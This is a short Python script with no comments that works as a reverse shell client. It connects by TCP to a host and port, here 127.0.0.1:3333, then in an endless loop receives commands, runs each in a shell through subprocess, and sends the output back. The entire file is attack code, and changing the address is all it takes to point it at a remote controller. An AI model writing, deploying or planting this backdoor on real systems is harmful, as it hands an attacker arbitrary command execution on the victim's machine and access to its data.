import socket 
import subprocess

host = '127.0.0.1'
port = 3333

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
	cmd = s.recv(1024)
	cmd = cmd.decode()
	cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
	cmd_process = cmd_process.stdout + cmd_process.stderr
	s.send(cmd_process)